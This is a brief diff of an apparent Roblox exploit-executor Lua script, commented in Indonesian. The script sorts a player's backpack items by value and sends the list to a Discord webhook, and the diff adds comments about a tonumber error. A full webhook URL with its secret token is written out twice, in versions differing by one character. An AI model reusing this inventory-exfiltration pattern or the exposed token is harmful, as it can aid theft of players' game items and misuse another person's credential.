@@ -34,6 +34,9 @@ for _, item in ipairs(backpack:GetChildren()) do
 end
 
 -- Urutkan berdasarkan nilai terbesar ke terkecil (perbaikan di sini)
+-- Error "invalid argument #2 to 'tonumber' (base out of range)" biasanya terjadi
+-- jika string.match mengembalikan nil, dan nil tersebut diteruskan ke tonumber.
+-- Kami menambahkan pemeriksaan untuk memastikan nilai yang cocok ada sebelum konversi.
 table.sort(backpackItems, function(a, b)
     local valueA_str = string.match(a, "→ ([%d,]+)#")
     local valueB_str = string.match(b, "→ ([%d,]+)#")
@@ -60,7 +63,8 @@ if #backpackStr > maxLength then
     backpackStr = string.sub(backpackStr, 1, maxLength - 3) .. "..."
 end
 
-local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSB8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
+-- URL Webhook Discord Anda. Pastikan ini adalah URL yang benar.
+local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSB8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGCl0v36uIgzrVwtU1zXh6" -- GANTI DENGAN WEBHOOK ASLI ANDA JIKA INI SALAH
 
 -- Pilih fungsi request sesuai executor
 local requestFunction = nil
